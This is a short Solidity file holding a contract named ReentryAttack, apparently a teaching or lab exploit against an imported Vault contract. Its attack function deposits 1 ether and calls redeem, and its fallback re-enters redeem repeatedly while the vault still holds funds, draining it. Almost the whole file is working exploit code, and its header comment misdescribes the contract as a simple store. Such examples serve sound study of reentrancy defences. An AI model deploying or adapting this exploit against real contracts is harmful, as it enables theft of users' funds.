// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.28;

import "./Vault.sol";

// You can store ETH in this contract and redeem them.
contract ReentryAttack {
    Vault public vault;

    event fallbackCalled();

    constructor(address _vaultAddress) {
        vault = Vault(_vaultAddress);
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        vault.store{value: 1 ether}();
        vault.redeem();
    }

    // Fallback is called by vault.redeem
    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            emit fallbackCalled();
            vault.redeem();
        }
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}